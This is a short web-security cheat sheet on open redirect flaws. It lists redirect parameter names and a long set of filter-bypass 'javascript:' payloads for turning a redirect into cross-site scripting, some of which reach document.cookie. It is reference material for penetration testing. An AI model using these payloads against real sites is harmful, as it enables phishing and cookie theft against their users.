An open redirect vulnerability occurs when an application allows a user to control a redirect or forward to another URL. If the app does not validate untrusted user input, an attacker could supply a URL that redirects an unsuspecting victim from a legitimate domain to an attacker’s phishing site.


# Common Parameters

```text
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
```


# Pivot to XSS
```
# Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

# Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Abuse bad subdomain filter
javascript://sub.domain.com/%0Aalert(1)

# Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

# Misc
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```


# Tools
## Oralyzer
[Oralyzer](https://github.com/r0075h3ll/Oralyzer), a simple python script that probes for Open Redirection vulnerability in a website. It does that by fuzzing the URL that is provided in the input

# References
- [https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html](https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html)
- [https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt](https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt)